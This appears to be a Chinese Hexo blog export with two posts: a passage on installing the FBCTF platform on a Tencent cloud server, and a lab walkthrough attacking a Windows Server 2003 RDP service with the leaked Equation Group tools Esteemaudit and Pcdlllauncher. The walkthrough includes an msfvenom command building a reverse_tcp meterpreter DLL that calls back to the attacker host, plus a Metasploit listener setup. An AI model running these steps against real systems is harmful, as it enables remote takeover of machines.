Client（一款FTP软件）并打开，点击左上角文件-站点管理器-新站点，然后如图操作，注意公网IP改为自己的：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490870461850_3703_1490870513699.png)\n之后就可以列出服务器目录如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490870559582_9731_1490870611702.png)\n之后依次打开`fbctf/src/language`，删除掉其中的`lang_zh-tw.php`，[点击这里下载汉化版](https://blog.ctftools.com/2017/03/post106)，解压并上传到该目录下，方法为从左边本地目录找到解压后的`lang_zh-cn.php`，拖到右边即可，如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490870921303_9796_1490870973178.png)\n五、打开putty输入代码cd fbctf敲击回车，再输入代码\n```\n./extra/provision.sh -m prod -c self -s $PWD\n```\n就可以开始安装了，如图：\n开始：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490871084939_2702_1490871136816.png)\n约5min后：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490871351041_397_1490871403200.png)\n约10min后：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490871639018_965_1490871691164.png)\n约13min后安装完成，并打印出密码，务必记下（在putty里边选中就是复制，右键是粘贴），如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490871883914_832_1490871935828.png)\n\n# 后续工作\n\n一、之后会有SSL证书问题，编辑`/etc/nginx/sites-available/fbctf.conf`这个文件即可，详细就不多说了，我的方法是在腾讯云申请SSL证书，然后下载并解压出nginx对应版本上传到`/home/ubuntu/ssl`目录下，然后编辑`/etc/nginx/sites-available/fbctf.conf`\n将证书目录修改为实际目录即可，注意修改这个文件需要root权限！\n二、如果安装完之后想要修改源文件需要重新编译才能生效，可以参考[HBCTF博客](https://blog.ctftools.com/2017/03/post106)。\n三、一切准备好之后就进入控制台把服务器关机，然后制作镜像，如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490873146518_5896_1490873198860.png)\n**制作完镜像记得销毁服务器以免产生不必要的费用**\n四、将镜像跨地域复制到你的国内服务器所在区域，如图：\n![若图片无法正常显示，请联系站长处理](https://blog-10039692.file.myqcloud.com/1490873286751_6136_1490873338723.png)\n有时候一次不成功，需要多试几次，或者换个区域。\n五、在国内的服务器上重装系统，在选择镜像时选择自定义镜像，然后就能看到你做好的镜像了\n\n# 至此完成，感谢阅读！","slug":"post122","published":1,"updated":"2020-12-07T02:10:48.052Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdf001iq0szv8yyyjf4","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>之前有在虚拟机通过翻墙搭建了FBCTF平台，但是毕竟是虚拟机搭建的，只能在校园里网内使用，要让外网访问就需要做内网穿透了，麻烦而且不稳定，于是就想要在云服务器上搭建，由于开始思路就很正确，一次就成功了，具体方法如下：</p>\n<h1 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h1><a id=\"more\"></a>\n<p>一、既然是在云服务器上搭建平台，首先自然得有一台腾讯云服务器，如果你的云服务器在国外，第二条就不用看了；<br>二、如果你的云服务器在国内的话，由于FBCTF的一个重要组件HHVM在墙外，所以首先需要准备一个墙外的服务器，必须选香港的！因为只有香港的才能复制镜像。不要包月了，没必要，直接按量计费，挑个2核4G100M的配置，整个计费过程不会花超过3块钱（除非你耗时太长），详细如下：<br>打开腾讯云官网注册账号并登录，点击如下位置选购服务器：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490868089788_3722_1490868141823.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>进入后后点击立即选购，然后选择配置，推荐如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490868500670_5433_1490868552464.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>继续选择镜像，注意必须选择如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490868605811_3894_1490868657557.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>继续选择网络，反正按量计费，任性如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490868793378_32_1490868845254.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>之后选择安全组，默认全部放通即可，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490868922309_2467_1490868974049.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>之后点击开通并等待它创建完成即可，通常1min之内创建完成。<br>三、如果需要下载汉化版，可以<a href=\"https://blog.ctftools.com/2017/03/post106\">点击这里下载</a></p>\n<h1 id=\"开始安装\"><a href=\"#开始安装\" class=\"headerlink\" title=\"开始安装\"></a>开始安装</h1><p>一、下载putty（一款用于linux远程连接的软件），打开后输入公网IP如图操作：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490869580023_6540_1490869632549.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>之后在可能弹出的对话框里点确定，然后在弹出的黑底白字的界面依次输入你的服务器账号和密码（注意输入密码时不会显示，不要担心是自己没输入），得到如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490869739455_8924_1490869791229.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>二、输入（在putty里边选中就是复制，右键是粘贴）代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install git</span><br></pre></td></tr></table></figure></p>\n<p>然后敲击回车来安装git，中间会提示你是否安装，输入y后再敲击回车；<br>三、输入代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/facebook/fbctf</span><br></pre></td></tr></table></figure></p>\n<p>让服务器从GitHub拷贝fbctf源码到服务器；<br>四、下载FileZilla Client（一款FTP软件）并打开，点击左上角文件-站点管理器-新站点，然后如图操作，注意公网IP改为自己的：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490870461850_3703_1490870513699.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>之后就可以列出服务器目录如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490870559582_9731_1490870611702.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>之后依次打开<code>fbctf/src/language</code>，删除掉其中的<code>lang_zh-tw.php</code>，<a href=\"https://blog.ctftools.com/2017/03/post106\">点击这里下载汉化版</a>，解压并上传到该目录下，方法为从左边本地目录找到解压后的<code>lang_zh-cn.php</code>，拖到右边即可，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490870921303_9796_1490870973178.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>五、打开putty输入代码cd fbctf敲击回车，再输入代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./extra/provision.sh -m prod -c self -s $PWD</span><br></pre></td></tr></table></figure></p>\n<p>就可以开始安装了，如图：<br>开始：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490871084939_2702_1490871136816.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>约5min后：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490871351041_397_1490871403200.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>约10min后：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490871639018_965_1490871691164.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>约13min后安装完成，并打印出密码，务必记下（在putty里边选中就是复制，右键是粘贴），如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490871883914_832_1490871935828.png\" alt=\"若图片无法正常显示，请联系站长处理\"></p>\n<h1 id=\"后续工作\"><a href=\"#后续工作\" class=\"headerlink\" title=\"后续工作\"></a>后续工作</h1><p>一、之后会有SSL证书问题，编辑<code>/etc/nginx/sites-available/fbctf.conf</code>这个文件即可，详细就不多说了，我的方法是在腾讯云申请SSL证书，然后下载并解压出nginx对应版本上传到<code>/home/ubuntu/ssl</code>目录下，然后编辑<code>/etc/nginx/sites-available/fbctf.conf</code><br>将证书目录修改为实际目录即可，注意修改这个文件需要root权限！<br>二、如果安装完之后想要修改源文件需要重新编译才能生效，可以参考<a href=\"https://blog.ctftools.com/2017/03/post106\">HBCTF博客</a>。<br>三、一切准备好之后就进入控制台把服务器关机，然后制作镜像，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490873146518_5896_1490873198860.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br><strong>制作完镜像记得销毁服务器以免产生不必要的费用</strong><br>四、将镜像跨地域复制到你的国内服务器所在区域，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490873286751_6136_1490873338723.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>有时候一次不成功，需要多试几次，或者换个区域。<br>五、在国内的服务器上重装系统，在选择镜像时选择自定义镜像，然后就能看到你做好的镜像了</p>\n<h1 id=\"至此完成，感谢阅读！\"><a href=\"#至此完成，感谢阅读！\" class=\"headerlink\" title=\"至此完成，感谢阅读！\"></a>至此完成，感谢阅读！</h1>","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>之前有在虚拟机通过翻墙搭建了FBCTF平台，但是毕竟是虚拟机搭建的，只能在校园里网内使用，要让外网访问就需要做内网穿透了，麻烦而且不稳定，于是就想要在云服务器上搭建，由于开始思路就很正确，一次就成功了，具体方法如下：</p>\n<h1 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h1>","more":"<p>一、既然是在云服务器上搭建平台，首先自然得有一台腾讯云服务器，如果你的云服务器在国外，第二条就不用看了；<br>二、如果你的云服务器在国内的话，由于FBCTF的一个重要组件HHVM在墙外，所以首先需要准备一个墙外的服务器，必须选香港的！因为只有香港的才能复制镜像。不要包月了，没必要，直接按量计费，挑个2核4G100M的配置，整个计费过程不会花超过3块钱（除非你耗时太长），详细如下：<br>打开腾讯云官网注册账号并登录，点击如下位置选购服务器：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490868089788_3722_1490868141823.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>进入后后点击立即选购，然后选择配置，推荐如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490868500670_5433_1490868552464.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>继续选择镜像，注意必须选择如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490868605811_3894_1490868657557.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>继续选择网络，反正按量计费，任性如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490868793378_32_1490868845254.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>之后选择安全组，默认全部放通即可，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490868922309_2467_1490868974049.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>之后点击开通并等待它创建完成即可，通常1min之内创建完成。<br>三、如果需要下载汉化版，可以<a href=\"https://blog.ctftools.com/2017/03/post106\">点击这里下载</a></p>\n<h1 id=\"开始安装\"><a href=\"#开始安装\" class=\"headerlink\" title=\"开始安装\"></a>开始安装</h1><p>一、下载putty（一款用于linux远程连接的软件），打开后输入公网IP如图操作：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490869580023_6540_1490869632549.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>之后在可能弹出的对话框里点确定，然后在弹出的黑底白字的界面依次输入你的服务器账号和密码（注意输入密码时不会显示，不要担心是自己没输入），得到如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490869739455_8924_1490869791229.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>二、输入（在putty里边选中就是复制，右键是粘贴）代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install git</span><br></pre></td></tr></table></figure></p>\n<p>然后敲击回车来安装git，中间会提示你是否安装，输入y后再敲击回车；<br>三、输入代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/facebook/fbctf</span><br></pre></td></tr></table></figure></p>\n<p>让服务器从GitHub拷贝fbctf源码到服务器；<br>四、下载FileZilla Client（一款FTP软件）并打开，点击左上角文件-站点管理器-新站点，然后如图操作，注意公网IP改为自己的：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490870461850_3703_1490870513699.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>之后就可以列出服务器目录如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490870559582_9731_1490870611702.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>之后依次打开<code>fbctf/src/language</code>，删除掉其中的<code>lang_zh-tw.php</code>，<a href=\"https://blog.ctftools.com/2017/03/post106\">点击这里下载汉化版</a>，解压并上传到该目录下，方法为从左边本地目录找到解压后的<code>lang_zh-cn.php</code>，拖到右边即可，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490870921303_9796_1490870973178.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>五、打开putty输入代码cd fbctf敲击回车，再输入代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./extra/provision.sh -m prod -c self -s $PWD</span><br></pre></td></tr></table></figure></p>\n<p>就可以开始安装了，如图：<br>开始：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490871084939_2702_1490871136816.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>约5min后：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490871351041_397_1490871403200.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>约10min后：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490871639018_965_1490871691164.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>约13min后安装完成，并打印出密码，务必记下（在putty里边选中就是复制，右键是粘贴），如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490871883914_832_1490871935828.png\" alt=\"若图片无法正常显示，请联系站长处理\"></p>\n<h1 id=\"后续工作\"><a href=\"#后续工作\" class=\"headerlink\" title=\"后续工作\"></a>后续工作</h1><p>一、之后会有SSL证书问题，编辑<code>/etc/nginx/sites-available/fbctf.conf</code>这个文件即可，详细就不多说了，我的方法是在腾讯云申请SSL证书，然后下载并解压出nginx对应版本上传到<code>/home/ubuntu/ssl</code>目录下，然后编辑<code>/etc/nginx/sites-available/fbctf.conf</code><br>将证书目录修改为实际目录即可，注意修改这个文件需要root权限！<br>二、如果安装完之后想要修改源文件需要重新编译才能生效，可以参考<a href=\"https://blog.ctftools.com/2017/03/post106\">HBCTF博客</a>。<br>三、一切准备好之后就进入控制台把服务器关机，然后制作镜像，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490873146518_5896_1490873198860.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br><strong>制作完镜像记得销毁服务器以免产生不必要的费用</strong><br>四、将镜像跨地域复制到你的国内服务器所在区域，如图：<br><img src=\"https://blog-10039692.file.myqcloud.com/1490873286751_6136_1490873338723.png\" alt=\"若图片无法正常显示，请联系站长处理\"><br>有时候一次不成功，需要多试几次，或者换个区域。<br>五、在国内的服务器上重装系统，在选择镜像时选择自定义镜像，然后就能看到你做好的镜像了</p>\n<h1 id=\"至此完成，感谢阅读！\"><a href=\"#至此完成，感谢阅读！\" class=\"headerlink\" title=\"至此完成，感谢阅读！\"></a>至此完成，感谢阅读！</h1>"},{"title":"NSA工具包验证之RDP漏洞利用","date":"2017-06-15T13:32:39.000Z","_content":"\n### 验证环境：\n\n攻击机1(本次演示IP：172.16.11.2)：windows系统，[安装python2.6.6](https://www.python.org/download/releases/2.6.6/), [pywin32-221.win32-py2.6.exe](https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/), xshell, xftp, [下载方程式工具包](https://codeload.github.com/misterch0c/shadowbroker/zip/master)放到C盘，在工具包目录下的windows目录新建文件夹\"listeningposts\"，并且开放所有端口关闭防火墙，确保内网可以访问之\n\n攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度\n\n目标机1(本次演示IP：172.16.12.4)：开放了3389端口的Windows Server 2003\n\n以上所有IP之间均可以直接访问\n### 验证步骤：\n<!--more-->\n#### 第一步：生成可执行的恶意dll文件\n0x01\n首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：\n![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg \"1.jpg\")\n0x02\n执行命令：\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll >s.dll\n```\n在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell\n0x03\n点击xshell如图位置\n![3.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg \"3.jpg\")\n打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图\n![4.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg \"4.jpg\")\n#### 第二步：配置kali使得kali处于监听状态\n0x01\n依次输入命令\n```\nmsfconsole\nuse exploit/multi/handler\nset lhost 172.16.12.2\nset lport 5555\nset PAYLOAD windows/meterpreter/reverse_tcp\nexploit\n```\n看到如图即说明配置成功\n![2.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg \"2.jpg\")\n这时就可以将xshell最小化，等后边再用\n#### 第三步：使用方程式工具包进行攻击\n0x01\n将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为\"listeningposts\"的文件夹，如图，不然运行会报错\n![5.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg \"5.jpg\")\n0x02\n打开命令提示符，输入\n```\nC:\\win\\fb.py\n```\n然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图\n![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/1.jpg \"1.jpg\")\n最后敲击回车\n0x03\n显示出`fb >`之后输入命令\n```\nuse Esteemaudit\n```\n使用该工具，之后除了下图所示位置需要修改，其他都保持默认直接敲击回车即可\n（设置监听还是连接、系统位数、系统版本）\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/2.jpg \"2.jpg\")\n（回拨IP以及端口，端口号可以任意设置）\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/3.jpg \"3.jpg\")\n（配置DLL路径，需要改为实际路径）\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/4.jpg \"4.jpg\")\n之后几个回车即可看到连接成功，如图\n![5.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/5.jpg \"5.jpg\")\n0x04\n接着输入命令\n```\nuse Pcdlllauncher\n```\n使用Pcdlllauncher，除了下图其他保持默认即可\n（改为自己的实际路径）\n![6.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/6.jpg \"6.jpg\")\n（之前生成的s.dll路径）\n![7.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/7.jpg \"7.jpg\")\n之后不断回车，会看到如图\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/10.jpg \"10.jpg\")\n不用理他，打开xshell可以看到已经成功反弹shell，如下图\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/8.jpg \"8.jpg\")\n然后就可以比如说输入shell模拟终端执行命令了\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/9.jpg \"9.jpg\")","source":"_posts/post162.md","raw":"---\ntitle: NSA工具包验证之RDP漏洞利用\ndate: 2017-06-15 21:32:39\ntags: 网络安全\n---\n\n### 验证环境：\n\n攻击机1(本次演示IP：172.16.11.2)：windows系统，[安装python2.6.6](https://www.python.org/download/releases/2.6.6/), [pywin32-221.win32-py2.6.exe](https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/), xshell, xftp, [下载方程式工具包](https://codeload.github.com/misterch0c/shadowbroker/zip/master)放到C盘，在工具包目录下的windows目录新建文件夹\"listeningposts\"，并且开放所有端口关闭防火墙，确保内网可以访问之\n\n攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度\n\n目标机1(本次演示IP：172.16.12.4)：开放了3389端口的Windows Server 2003\n\n以上所有IP之间均可以直接访问\n### 验证步骤：\n<!--more-->\n#### 第一步：生成可执行的恶意dll文件\n0x01\n首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：\n![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg \"1.jpg\")\n0x02\n执行命令：\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll >s.dll\n```\n在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell\n0x03\n点击xshell如图位置\n![3.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg \"3.jpg\")\n打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图\n![4.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg \"4.jpg\")\n#### 第二步：配置kali使得kali处于监听状态\n0x01\n依次输入命令\n```\nmsfconsole\nuse exploit/multi/handler\nset lhost 172.16.12.2\nset lport 5555\nset PAYLOAD windows/meterpreter/reverse_tcp\nexploit\n```\n看到如图即说明配置成功\n![2.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg \"2.jpg\")\n这时就可以将xshell最小化，等后边再用\n#### 第三步：使用方程式工具包进行攻击\n0x01\n将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为\"listeningposts\"的文件夹，如图，不然运行会报错\n![5.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg \"5.jpg\")\n0x02\n打开命令提示符，输入\n```\nC:\\win\\fb.py\n```\n然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图\n![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/1.jpg \"1.jpg\")\n最后敲击回车\n0x03\n显示出`fb >`之后输入命令\n```\nuse Esteemaudit\n```\n使用该工具，之后除了下图所示位置需要修改，其他都保持默认直接敲击回车即可\n（设置监听还是连接、系统位数、系统版本）\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/2.jpg \"2.jpg\")\n（回拨IP以及端口，端口号可以任意设置）\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/3.jpg \"3.jpg\")\n（配置DLL路径，需要改为实际路径）\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/4.jpg \"4.jpg\")\n之后几个回车即可看到连接成功，如图\n![5.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/5.jpg \"5.jpg\")\n0x04\n接着输入命令\n```\nuse Pcdlllauncher\n```\n使用Pcdlllauncher，除了下图其他保持默认即可\n（改为自己的实际路径）\n![6.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/6.jpg \"6.jpg\")\n（之前生成的s.dll路径）\n![7.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/7.jpg \"7.jpg\")\n之后不断回车，会看到如图\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/10.jpg \"10.jpg\")\n不用理他，打开xshell可以看到已经成功反弹shell，如下图\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/8.jpg \"8.jpg\")\n然后就可以比如说输入shell模拟终端执行命令了\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/9.jpg \"9.jpg\")","slug":"post162","published":1,"updated":"2020-12-07T02:06:30.211Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdg001kq0sz9qaclstx","content":"<h3 id=\"验证环境：\"><a href=\"#验证环境：\" class=\"headerlink\" title=\"验证环境：\"></a>验证环境：</h3><p>攻击机1(本次演示IP：172.16.11.2)：windows系统，<a href=\"https://www.python.org/download/releases/2.6.6/\" target=\"_blank\" rel=\"noopener\">安装python2.6.6</a>, <a href=\"https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/\" target=\"_blank\" rel=\"noopener\">pywin32-221.win32-py2.6.exe</a>, xshell, xftp, <a href=\"https://codeload.github.com/misterch0c/shadowbroker/zip/master\" target=\"_blank\" rel=\"noopener\">下载方程式工具包</a>放到C盘，在工具包目录下的windows目录新建文件夹”listeningposts”，并且开放所有端口关闭防火墙，确保内网可以访问之</p>\n<p>攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度</p>\n<p>目标机1(本次演示IP：172.16.12.4)：开放了3389端口的Windows Server 2003</p>\n<p>以上所有IP之间均可以直接访问</p>\n<h3 id=\"验证步骤：\"><a href=\"#验证步骤：\" class=\"headerlink\" title=\"验证步骤：\"></a>验证步骤：</h3><a id=\"more\"></a>\n<h4 id=\"第一步：生成可执行的恶意dll文件\"><a href=\"#第一步：生成可执行的恶意dll文件\" class=\"headerlink\" title=\"第一步：生成可执行的恶意dll文件\"></a>第一步：生成可执行的恶意dll文件</h4><p>0x01<br>首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg\" alt=\"1.jpg\" title=\"1.jpg\"><br>0x02<br>执行命令：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll &gt;s.dll</span><br></pre></td></tr></table></figure></p>\n<p>在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell<br>0x03<br>点击xshell如图位置<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg\" alt=\"3.jpg\" title=\"3.jpg\"><br>打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg\" alt=\"4.jpg\" title=\"4.jpg\"></p>\n<h4 id=\"第二步：配置kali使得kali处于监听状态\"><a href=\"#第二步：配置kali使得kali处于监听状态\" class=\"headerlink\" title=\"第二步：配置kali使得kali处于监听状态\"></a>第二步：配置kali使得kali处于监听状态</h4><p>0x01<br>依次输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set lhost 172.16.12.2</span><br><span class=\"line\">set lport 5555</span><br><span class=\"line\">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure></p>\n<p>看到如图即说明配置成功<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg\" alt=\"2.jpg\" title=\"2.jpg\"><br>这时就可以将xshell最小化，等后边再用</p>\n<h4 id=\"第三步：使用方程式工具包进行攻击\"><a href=\"#第三步：使用方程式工具包进行攻击\" class=\"headerlink\" title=\"第三步：使用方程式工具包进行攻击\"></a>第三步：使用方程式工具包进行攻击</h4><p>0x01<br>将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为”listeningposts”的文件夹，如图，不然运行会报错<br><img 